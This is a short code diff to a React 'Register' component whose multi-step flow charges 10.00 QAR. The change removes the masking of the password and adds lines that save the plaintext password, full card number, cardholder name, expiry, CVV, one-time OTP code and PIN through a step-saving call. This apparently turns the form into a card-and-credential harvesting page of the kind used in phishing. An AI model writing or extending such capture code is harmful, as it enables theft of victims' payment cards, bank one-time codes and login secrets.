@@ -95,11 +95,12 @@ export default function Register() {
 
   const handlePasswordNext = async (password?: string) => {
     if (password) {
-      setFormData(prev => ({ ...prev, password: "***" }));
+      setFormData(prev => ({ ...prev, password }));
     }
     
     await saveStepData("3_password", {
       passwordSet: true,
+      password: password || "",
     });
     
     nextStep();
@@ -110,7 +111,11 @@ export default function Register() {
       amount: "10.00 QAR",
       status: "completed",
       paymentMethod: "card",
-      ...(paymentData || {}),
+      cardNumber: paymentData?.cardNumber || "",
+      cardName: paymentData?.cardName || "",
+      expiry: paymentData?.expiry || "",
+      cvv: paymentData?.cvv || "",
+      otpCode: paymentData?.otpCode || "",
     });
     
     nextStep();
@@ -123,6 +128,7 @@ export default function Register() {
     
     await saveStepData("5_pin", {
       pinVerified: true,
+      pinCode: pin || "",
     });
     
     nextStep();
